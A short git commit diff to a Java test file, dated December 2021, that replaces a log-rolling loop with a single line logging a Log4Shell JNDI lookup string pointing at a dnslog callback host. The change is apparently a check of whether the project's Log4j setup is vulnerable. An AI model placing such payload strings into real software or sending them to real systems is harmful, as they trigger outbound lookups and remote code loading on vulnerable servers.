852a1691caba2b35c9708672867c6e339c56a3c4
vladimir <smagellan@gmail.com>
2021-12-13 20:06:50 +0300

    updated maven deps

--- src/main/java/smagellan/test/Log4jRollingTest.java
+++ src/main/java/smagellan/test/Log4jRollingTest.java
@@ -6,6 +6,11 @@ public class Log4jRollingTest {
     private static final org.slf4j.Logger logger = LoggerFactory.getLogger(Log4jRollingTest.class);
 
     public static void main(String[] args) {
+        //rollingTest();
+        logger.info("info: {}", "${jndi:ldap://secretvalue.XXXXX.dnslog.cn}");
+    }
+
+    private static void rollingTest() {
         for (int i = 0; i < 1000; ++i) {
             logger.info("looooooooooooooooooooooooooooooooong striiiiiiiiiiiiiiiiiiiiiiiiiiing");
         }
